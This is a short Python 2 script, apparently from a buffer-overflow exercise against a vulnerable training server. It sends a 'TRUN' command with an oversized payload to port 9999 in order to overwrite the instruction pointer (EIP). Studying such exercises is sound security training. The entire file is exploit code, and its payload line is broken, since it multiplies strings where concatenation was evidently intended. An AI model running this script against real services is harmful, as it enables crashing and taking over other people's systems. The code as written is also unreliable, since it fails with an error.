#!/usr/bin/python
import sys, socket

# EIP starts with 2003 bytes
shellcode = "A" * 2003 * "B" * 4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("YOUR_IP_ADDRESS", 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print "Error connecting to server"
    sys.exit()
